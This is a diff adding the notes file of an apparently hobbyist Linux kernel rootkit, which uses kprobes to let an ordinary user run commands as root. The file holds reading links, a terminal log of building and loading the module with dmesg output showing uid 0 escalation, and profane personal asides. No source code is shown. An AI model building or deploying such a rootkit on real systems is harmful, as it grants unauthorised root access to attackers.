@@ -1,0 +1,71 @@
+Shawn the R0ck - Jun 23 2013
+
+For further readings:
+
+https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/
+https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/
+http://www.mjmwired.net/kernel/Documentation/credentials.txt
+
+Shawn the R0ck - Nov 22nd, 2012
+
+It's fucking busy on day job recently. But I still could'nt forget the
+most important thing: Night job. Hacking on security stuff is much fun
+than other tehcnique field. Endless functional testing did really
+fucked my mind. I need a fresh air and take a deep breathe...PM 2.5 is
+fucking high in Beijing, shit*Why should I be here? I really want to
+go back to hometown if I can work at home. Wait a min, where is my
+fucking home? Switchfoot told us that we do not belong here-_-
+
+hmm..I bullshited a lot again...Let's talk about this example
+program. It's a simple rootkit for GNU/Linux kernel and it was
+implemented via kprobe[1] mechanism, which is provided by kernel
+itself. kprobe is very powerfull and it was designed for kernel
+debugging. Or, we could use it do our things. You known, as a security
+guy, makes your hands dirty in the kernel land is just matter of
+time. This rootkit allows use normal users do the root's business.
+
+--------------------------------------------------------------------
+Show time:
+root@sl13:/home/john/dumb_rootkit# make
+make -C /lib/modules/2.6.39-smp/build/ M=/home/john/dumb_rootkit modules
+make[1]: Entering directory `/usr/src/linux-2.6.39'
+  CC [M]  /home/john/dumb_rootkit/dumb_rootkit.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/john/dumb_rootkit/dumb_rootkit.mod.o
+  LD [M]  /home/john/dumb_rootkit/dumb_rootkit.ko
+make[1]: Leaving directory `/usr/src/linux-2.6.39'
+root@sl13:/home/john/dumb_rootkit# insmod dumb_rootkit.ko 
+root@sl13:/home/john/dumb_rootkit# exit
+exit
+john@sl13:~/dumb_rootkit$ /usr/sbin/iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+john@sl13:~/dumb_rootkit$ dmesg -c
+[ 5700.687828] Planted jprobe at c10ffb20, handler addr d8e32000
+[ 5707.502249] jprobe: filename: /usr/bin/id from bash, pid = 6393, uid = 0, gid = 0
+[ 5728.728063] jprobe: filename: /usr/sbin/iptables from bash, pid = 6394, uid = 0, gid = 0
+[ 5730.936214] jprobe: filename: /bin/dmesg from bash, pid = 6395, uid = 0, gid = 0
+--------------------------------------------------------------------
+
+What the fuck was going on? RTFSC.....
+
+Today is Thanksgiving Day. I'm celebrating this holiday but I'm not a
+yankee. I'm a christian but I'm not very religious. I get used to call
+myself a "neo-calvinist technological christian". It's quite long,
+isn't it? The matter is that name is not important anymore. In the
+cyber space( internet?), it doesn't fucking matter who you are or how
+rich you are. Even we( hackers?) don't care about your sexy ass. The
+idea is the only matter!
+
+Thank God, Phrack is still running...and, never better!
+
+May L0rd's hacking spirit guide us!!!
+
+[1] http://phrack.org/issues.html?issue=67&id=6#article
